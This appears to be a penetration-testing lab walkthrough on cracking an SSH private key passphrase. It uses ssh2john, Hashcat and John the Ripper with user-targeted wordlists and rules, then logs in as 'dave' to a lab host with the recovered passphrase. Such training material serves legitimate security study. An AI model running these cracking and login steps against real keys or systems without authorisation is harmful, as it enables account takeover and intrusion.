SSH Private Key Passphrase Cracking

Objective

Recover the passphrase protecting an SSH private key to enable authentication to a remote system.

1. Extract and Format the Hash

Tool used

  • ssh2john (John the Ripper utility)

Command

ssh2john id_rsa > ssh.hash

Key points

  • Converts private key into crackable hash format
  • Output includes metadata such as encryption type
  • "$6$" indicates SHA-512-based KDF
2. Identify Hashcat Mode

Search Hashcat modes

hashcat -h | grep -i ssh

Relevant modes

  • 22911 → OpenSSH private keys ($0$)
  • 22921 → OpenSSH private keys ($6$)
  • 22931 → OpenSSH private keys ($1, $3$)

Selected mode

Mode 22921 corresponds to "$6$" keys.

3. Analyze Password Policy

From notes

  • Minimum 3 numbers
  • At least 1 uppercase letter
  • At least 1 special character

Observed patterns

  • Numeric pattern example: 137
  • Common capitalization at start
  • Special characters often from: ! @ #
4. Prepare Wordlist

Example wordlist

Window
rickc137
dave
superdave
megadave
umbrella

Strategy

  • Use known user-related keywords
  • Include previously observed passwords
  • Leverage behavioral patterns of the user
5. Rule-Based Mutations

Custom rule file

c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

Explanation

  • c → capitalize first letter
  • $1 $3 $7 → append numbers
  • $! $@ $# → append special characters
6. Hashcat Attempt

Command

hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

Issue encountered

  • "Token length exception"
  • Indicates unsupported format or cipher

Reason

Some modern SSH keys use AES-256-CTR, which may not be supported by this mode.

7. Switching to John the Ripper

Why switch tools

  • Better support for certain SSH key formats
  • Handles more cipher variations

Rule integration

[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

Add rules to configuration

sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
8. Cracking with John

Command

john --wordlist=ssh.passwords --rules=sshRules ssh.hash

Result

Recovered passphrase: Umbrella137!

9. Using the Cracked Passphrase

SSH login

ssh -i id_rsa -p 2222 dave@192.168.50.201

Outcome

  • Passphrase entered successfully
  • Access to remote system obtained
Key Takeaways
  • SSH private keys can be protected by passphrases that are crackable offline.
  • ssh2john is used to convert keys into hash format.
  • Correct hash mode selection is critical for cracking tools.
  • Rule-based attacks should reflect observed user behavior and password policies.
  • Tool limitations may require switching between Hashcat and John the Ripper.
